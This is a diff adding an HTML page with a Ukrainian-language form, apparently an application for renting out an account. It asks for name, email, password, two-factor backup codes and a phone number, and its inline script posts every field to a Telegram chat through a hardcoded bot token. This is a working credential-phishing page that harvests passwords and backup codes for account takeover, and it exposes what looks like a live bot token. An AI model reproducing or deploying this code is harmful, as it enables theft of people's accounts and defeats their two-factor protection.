@@ -1,0 +1,80 @@
+
+
+  <div class="container mt-5 pt-5 pb-5">
+    <div class="col-md-6 offset-md-3">
+      <form id="tg">
+        <div class="form-group">
+          <label class="form-label">Ім'я</label>
+          <input type="text" name="name" class="form-control">
+        </div>
+        <!-- /.form-group -->
+        <div class="form-group">
+          <label class="form-label">Email</label>
+          <input type="email" name="email" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Пароль</label>
+          <input type="text" name="password" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Резервні коди</label>
+          <input type="text" name="codes" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Номер телефону</label>
+          <input type="text" name="namber" class="form-control">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Цей акаунт раніше був в оренді?</label>
+          <input type="text" name="yesno" class="form-control">
+        </div>
+        <!-- /.form-group -->
+
+        <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
+
+        <button type="submit" class="btn btn-primary mt-10">Відпровити</button>
+      </form>
+    </div>
+  </div>
+  <!-- /.col-md-6 offset-md-3 -->
+  </div>
+  <!-- /.container -->
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+  <script>
+    const TOKEN = "5640232171:AAH48wqsLGFhWfMxkNhpNj_giUowl3bMThM";
+    const CHAT_ID = "-1001581557176";
+    const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
+    const success = document.getElementById('success');
+    document.getElementById('tg').addEventListener('submit', function(e) {
+      e.preventDefault();
+      let message = `<b>Заявка з сайту!</b>\n`;
+      message += `<b>Відправник:</b> ${ this.name.value }\n`;
+      message += `<b>Пошта:</b> ${ this.email.value }\n`;
+      message += `<b>Пароль:</b> ${ this.password.value }\n`;
+      message += `<b>Коди:</b> ${ this.codes.value }\n`;
+      message += `<b>Номер:</b> ${ this.namber.value }\n`;
+      message += `<b>Був в оренді?</b> ${ this.yesno.value }`;
+      axios.post(URI_API, {
+          chat_id: CHAT_ID,
+          parse_mode: 'html',
+          text: message
+        })
+        .then((res) => {
+          this.yesno.value = "";
+          this.yesno.value = "";
+          success.innerHTML = 'Форма заповнена! ✅ Ми з вам відповімо протягом години ';
+          success.style.display = 'block';
+        })
+        .catch((err) => {
+          console.warn(err);
+        })
+        .finally(() => {
+          comsole.log('Кінец');
+        })
+    })
+  </script>
+
+</body>
+
+</html>
